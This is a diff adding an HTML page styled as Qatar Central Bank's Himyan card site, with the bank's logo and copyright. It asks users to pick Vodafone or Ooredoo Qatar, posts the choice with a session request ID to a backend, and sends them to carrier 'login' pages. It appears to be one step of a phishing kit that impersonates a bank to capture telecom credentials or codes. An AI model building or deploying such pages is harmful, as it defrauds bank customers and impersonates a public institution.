@@ -1,0 +1,163 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="اختيار مزود الشبكة لبطاقة هميان." />
+    <title>اختيار مزود الشبكة | هميان</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css" />
+    <style>
+        .provider-selection {
+            max-width: 860px;
+            margin: 0 auto;
+            padding: 40px 20px
+        }
+
+        .provider-heading {
+            text-align: center;
+            margin-bottom: 40px
+        }
+
+        .provider-heading h1 {
+            font-size: clamp(28px, 5vw, 36px);
+            color: #8a173b;
+            margin-bottom: 12px
+        }
+
+        .provider-heading p {
+            font-size: 18px;
+            color: #6d6066;
+            line-height: 1.6
+        }
+
+        .provider-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 24px;
+            margin-bottom: 32px
+        }
+
+        .provider-card {
+            background: #fff;
+            border: 2px solid #e8dde2;
+            border-radius: 16px;
+            padding: 32px;
+            text-align: center;
+            cursor: pointer;
+            transition: all .3s ease
+        }
+
+        .provider-card:hover {
+            border-color: #8a173b;
+            transform: translateY(-4px);
+            box-shadow: 0 8px 24px rgba(138, 23, 59, .12)
+        }
+
+        .provider-card.selected {
+            border-color: #8a173b;
+            background: #faf8f9
+        }
+
+        .provider-logo {
+            height: 80px;
+            margin-bottom: 20px;
+            object-fit: contain
+        }
+
+        .provider-name {
+            font-size: 22px;
+            font-weight: 700;
+            color: #3d1827;
+            margin-bottom: 8px
+        }
+
+        .provider-description {
+            font-size: 15px;
+            color: #6d6066;
+            line-height: 1.6
+        }
+
+        .provider-actions {
+            text-align: center
+        }
+
+        .demo-pay-button {
+            min-width: 200px;
+            padding: 16px 32px;
+            font-size: 18px
+        }
+
+        .demo-form-message {
+            color: #b52b49;
+            text-align: center;
+            margin-top: 16px
+        }
+    </style>
+</head>
+
+<body class="success-page">
+    <header class="site-header">
+        <div class="header-top container">
+            <div class="mobile-controls"><button class="menu-toggle" type="button" aria-label="فتح القائمة"
+                    aria-expanded="false"
+                    aria-controls="main-navigation"><span></span><span></span><span></span></button><a
+                    class="mobile-language" href="#" data-language-switch>EN</a></div>
+            <a class="qcb-link" href="https://www.qcb.gov.qa" aria-label="مصرف قطر المركزي"><img class="qcb-logo"
+                    src="qcb-logo.svg" alt="مصرف قطر المركزي" /></a>
+            <a class="himyan-link" href="index.html#top" aria-label="هميان"><img class="himyan-logo" src="logo.svg"
+                    alt="هميان HIMYAN" /></a>
+        </div>
+        <nav id="main-navigation" class="main-navigation container" aria-label="القائمة الرئيسية"><a
+                href="index.html#top">عن هميان</a><a href="index.html#about">أهداف إصدار البطاقة</a><a
+                href="index.html#cards">مواصفات البطاقة</a><a href="index.html#advantages">مميزات البطاقة</a><a
+                href="index.html#cards">عروض البطاقة</a><a href="index.html#cards">الأخبار</a><a
+                href="index.html#cards">مصدرو البطاقة</a><a href="index.html#cards">الفئات المستهدفة</a><a
+                href="index.html#cards">إرشادات أمنية</a><a class="language" href="#" data-language-switch>EN</a></nav>
+    </header>
+    <main class="confirmation-main">
+        <section class="provider-selection">
+            <div class="provider-heading">
+                <h1 id="page-heading">اختر مزود الشبكة</h1>
+                <p id="page-message">يرجى اختيار مزود الشبكة الذي تستخدمه للمتابعة</p>
+            </div>
+            <div class="provider-cards">
+                <div class="provider-card" data-provider="vodafone" role="button" tabindex="0">
+                    <div class="provider-logo" style="color:#e60000;font-size:48px;font-weight:900;line-height:80px">
+                        Vodafone</div>
+                    <div class="provider-name" id="vodafone-name">فودافون قطر</div>
+                    <div class="provider-description" id="vodafone-desc">Vodafone Qatar</div>
+                </div>
+                <div class="provider-card" data-provider="ooredoo" role="button" tabindex="0">
+                    <div class="provider-logo" style="color:#a50034;font-size:48px;font-weight:900;line-height:80px">
+                        ooredoo</div>
+                    <div class="provider-name" id="ooredoo-name">أوريدو قطر</div>
+                    <div class="provider-description" id="ooredoo-desc">Ooredoo Qatar</div>
+                </div>
+            </div>
+            <div class="provider-actions">
+                <button class="demo-pay-button" id="continue-button" disabled>متابعة</button>
+                <p class="demo-form-message" id="provider-message" role="status" aria-live="polite"></p>
+            </div>
+        </section>
+    </main>
+    <footer class="site-footer">
+        <div class="container footer-inner">
+            <p id="footer-rights">جميع الحقوق محفوظة © - مصرف قطر المركزي 2024</p>
+            <nav aria-label="روابط التذييل"><a href="index.html#top" id="footer-map">خريطة الموقع</a><a href="#"
+                    id="footer-legal">حقوق النشر وحدود المسئولية</a><a href="#" id="footer-privacy">الخصوصية</a></nav>
+        </div>
+    </footer>
+    <script>
+        const params = new URLSearchParams(window.location.search); const lang = params.get('lang') === 'en' ? 'en' : 'ar'; const requestId = params.get('requestId') || localStorage.getItem('himyan-request-id') || '';
+        const copy = lang === 'en' ? { heading: 'Choose Network Provider', message: 'Please select your network provider to continue', vodafoneName: 'Vodafone Qatar', vodafoneDesc: 'Vodafone Qatar', ooredooName: 'Ooredoo Qatar', ooredooDesc: 'Ooredoo Qatar', continue: 'Continue', error: 'Please select a provider.', missing: 'The request session has expired.', footer: 'All rights reserved © — Qatar Central Bank 2024', map: 'Sitemap', legal: 'Copyright and disclaimer', privacy: 'Privacy' } : { heading: 'اختر مزود الشبكة', message: 'يرجى اختيار مزود الشبكة الذي تستخدمه للمتابعة', vodafoneName: 'فودافون قطر', vodafoneDesc: 'Vodafone Qatar', ooredooName: 'أوريدو قطر', ooredooDesc: 'Ooredoo Qatar', continue: 'متابعة', error: 'يرجى اختيار مزود الشبكة.', missing: 'انتهت جلسة الطلب.', footer: 'جميع الحقوق محفوظة © - مصرف قطر المركزي 2024', map: 'خريطة الموقع', legal: 'حقوق النشر وحدود المسئولية', privacy: 'الخصوصية' };
+        document.documentElement.lang = lang; document.documentElement.dir = lang === 'en' ? 'ltr' : 'rtl'; document.title = copy.heading + ' | Himyan'; document.querySelector('#page-heading').textContent = copy.heading; document.querySelector('#page-message').textContent = copy.message; document.querySelector('#vodafone-name').textContent = copy.vodafoneName; document.querySelector('#vodafone-desc').textContent = copy.vodafoneDesc; document.querySelector('#ooredoo-name').textContent = copy.ooredooName; document.querySelector('#ooredoo-desc').textContent = copy.ooredooDesc; document.querySelector('#continue-button').textContent = copy.continue; document.querySelector('#footer-rights').textContent = copy.footer; document.querySelector('#footer-map').textContent = copy.map; document.querySelector('#footer-legal').textContent = copy.legal; document.querySelector('#footer-privacy').textContent = copy.privacy;
+        document.querySelectorAll('[data-language-switch]').forEach((switcher) => { switcher.textContent = lang === 'ar' ? 'EN' : 'AR'; switcher.addEventListener('click', (event) => { event.preventDefault(); const next = lang === 'ar' ? 'en' : 'ar'; const url = new URL(window.location.href); url.searchParams.set('lang', next); window.location.href = url.toString(); }); }); const menuToggle = document.querySelector('.menu-toggle'); const navigation = document.querySelector('.main-navigation'); menuToggle?.addEventListener('click', () => { const expanded = menuToggle.getAttribute('aria-expanded') === 'true'; menuToggle.setAttribute('aria-expanded', String(!expanded)); navigation?.classList.toggle('is-open', !expanded); });
+        let selectedProvider = ''; const cards = document.querySelectorAll('.provider-card'); const continueBtn = document.querySelector('#continue-button'); cards.forEach(card => { card.addEventListener('click', () => { cards.forEach(c => c.classList.remove('selected')); card.classList.add('selected'); selectedProvider = card.dataset.provider; continueBtn.disabled = false; }); card.addEventListener('keydown', (e) => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); card.click(); } }); }); continueBtn.addEventListener('click', async () => { const message = document.querySelector('#provider-message'); if (!selectedProvider) { message.textContent = copy.error; message.style.display = 'block'; return; } if (!requestId) { message.textContent = copy.missing; message.style.display = 'block'; return; } continueBtn.disabled = true; try { const response = await fetch('/api/requests/network-provider', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: requestId, provider: selectedProvider }) }); if (!response.ok) throw new Error('submit failed'); window.location.href = `${selectedProvider}-login.html?lang=${lang}&requestId=${encodeURIComponent(requestId)}`; } catch { message.textContent = lang === 'en' ? 'Unable to save provider selection. Please try again.' : 'تعذر حفظ اختيار المزود. يرجى المحاولة مرة أخرى.'; message.style.display = 'block'; continueBtn.disabled = false; } });
+    </script>
+</body>
+
+</html>
